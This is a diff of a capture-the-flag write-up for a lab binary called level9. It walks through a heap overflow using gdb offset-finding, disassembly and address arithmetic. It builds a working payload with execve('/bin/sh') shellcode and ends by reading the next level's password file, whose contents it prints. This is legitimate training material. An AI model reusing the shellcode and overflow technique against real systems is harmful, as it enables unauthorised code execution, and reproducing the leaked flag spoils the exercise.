@@ -1,23 +1,130 @@
 (python -c 'print "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*85 + "\x0c\xa0\x04\x08"' ; cat) | ./level9
+As usual we decompilate the program to read the source code easyly.
+We can see that the program allocate two var with new : n1 and n2.
+And n1 is allocated with argv[1], passed into setAnnotation, the information of argv[1] is writed with memcpy.
 
+1) Find the offset :
 gdb ./level9 
-GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
-Copyright (C) 2012 Free Software Foundation, Inc.
-License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
-This is free software: you are free to change and redistribute it.
-There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
-and "show warranty" for details.
-This GDB was configured as "i686-linux-gnu".
-For bug reporting instructions, please see:
-<http://bugs.launchpad.net/gdb-linaro/>...
-Reading symbols from /home/user/level9/level9...(no debugging symbols found)...done.
-(gdb) info register eax
-The program has no registers now.
-(gdb) run "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
-Starting program: /home/user/level9/level9 "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
+(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Starting program: /home/user/level9/level9 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
 
 Program received signal SIGSEGV, Segmentation fault.
 0x08048682 in main ()
 (gdb) info register eax
 eax            0x41366441	1094083649
-(gdb) 
+
+Like this we found the offset 0x41366441 = 108
+
+2) Like in level2 we need to inject shellcode and overflow the buffer.
+Here we need to overflow with 108 --> The space between n1 and n2.
+So if we overflow n1, we will overwrite n2, and we will be able to call the shellcode injected because n2 is called at the end of the program (in the return statement).
+
+let s disassemble the main function :
+
+(gdb) disas main
+Dump of assembler code for function main:
+   0x080485f4 <+0>:	push   %ebp
+   0x080485f5 <+1>:	mov    %esp,%ebp
+   0x080485f7 <+3>:	push   %ebx
+   0x080485f8 <+4>:	and    $0xfffffff0,%esp
+   0x080485fb <+7>:	sub    $0x20,%esp
+   0x080485fe <+10>:	cmpl   $0x1,0x8(%ebp)
+   0x08048602 <+14>:	jg     0x8048610 <main+28>
+   0x08048604 <+16>:	movl   $0x1,(%esp)
+   0x0804860b <+23>:	call   0x80484f0 <_exit@plt>
+   0x08048610 <+28>:	movl   $0x6c,(%esp)
+   0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>
+   0x0804861c <+40>:	mov    %eax,%ebx
+   0x0804861e <+42>:	movl   $0x5,0x4(%esp)
+   0x08048626 <+50>:	mov    %ebx,(%esp)
+   0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>
+   0x0804862e <+58>:	mov    %ebx,0x1c(%esp)
+   0x08048632 <+62>:	movl   $0x6c,(%esp)
+   0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>
+   0x0804863e <+74>:	mov    %eax,%ebx
+   0x08048640 <+76>:	movl   $0x6,0x4(%esp)
+   0x08048648 <+84>:	mov    %ebx,(%esp)
+   0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>
+   0x08048650 <+92>:	mov    %ebx,0x18(%esp)
+   0x08048654 <+96>:	mov    0x1c(%esp),%eax
+   0x08048658 <+100>:	mov    %eax,0x14(%esp)
+   0x0804865c <+104>:	mov    0x18(%esp),%eax
+   0x08048660 <+108>:	mov    %eax,0x10(%esp)
+   0x08048664 <+112>:	mov    0xc(%ebp),%eax
+   0x08048667 <+115>:	add    $0x4,%eax
+   0x0804866a <+118>:	mov    (%eax),%eax
+---Type <return> to continue, or q <return> to quit---
+   0x0804866c <+120>:	mov    %eax,0x4(%esp)
+   0x08048670 <+124>:	mov    0x14(%esp),%eax
+   0x08048674 <+128>:	mov    %eax,(%esp)
+   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
+=> 0x0804867c <+136>:	mov    0x10(%esp),%eax
+   0x08048680 <+140>:	mov    (%eax),%eax
+   0x08048682 <+142>:	mov    (%eax),%edx
+   0x08048684 <+144>:	mov    0x14(%esp),%eax
+   0x08048688 <+148>:	mov    %eax,0x4(%esp)
+   0x0804868c <+152>:	mov    0x10(%esp),%eax
+   0x08048690 <+156>:	mov    %eax,(%esp)
+   0x08048693 <+159>:	call   *%edx
+   0x08048695 <+161>:	mov    -0x4(%ebp),%ebx
+   0x08048698 <+164>:	leave  
+   0x08048699 <+165>:	ret 
+
+We are going to break after the call of the function N::setAnnotation(char *s) and we will print the stack :
+(gdb) break *0x0804867c
+(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+(gdb) x/x $esp
+0xbffff6c0:	0x0804a008
+"x" is the command in GDB for examining memory.
+"/x" is the format specifier that specifies how the memory should be displayed. In this case, "/x" indicates that the memory should be displayed in hexadecimal format.
+"$esp" refers to the value stored in the %esp register, which is the current stack pointer.
+
+3) Now we want to know where we start to write in the stack, we will use (Same in the level6) :
+
+(gdb) x/20x 0x0804a008
+0x804a008:	0x08048848	0x41414141	0x41414141	0x41414141
+0x804a018:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a028:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a038:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a048:	0x41414141	0x41414141	0x00000000	0x00000000
+
+We see that we start to write 4 bytes after the address 0x0804a008.
+Let s use python to calculate our new address :
+
+>>> 0x0804a008		---> convert hexa to decimal
+134520840
+>>> 134520840 + 4 	---> add 4 to the address in decimal
+134520844
+>>> hex(134520844) 	---> convert decimal to hexa
+'0x804a00c'			---> it s the address of our buffer
+>>> 
+
+Now we want to add 4 bytes to 0x804a00c 
+
+>>> 0x0804a00c
+134520844
+>>> 134520844 + 4
+134520848
+>>> hex(134520848)
+'0x804a010'			---> its the address of the shellcode (we will inject it in the buffer)
+>>> 
+
+
+4) Convert the two addresses in little endian :
+0x0804a00c in little endian = \x0c\xa0\x04\x08
+0x0804a010 in little endian = \x10\xa0\x04\x08
+
+
+5) Choose the good shellcode :
+We take back the shellcode from level2 (execve(/bin/sh)): \x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
+This shellcode : 24 bytes.
+
+6) Write the good payload :
+
+Offset = 108 bytes - 24 bytes - 4 bytes = 80 bytes --> "\x90"*80
+
+| Address of shellcode (4 bytes) | Shellcode (24 bytes) | Offset | Address of buffer (4 bytes) | 
+
+./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*80 + "\x0c\xa0\x04\x08"')
+$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
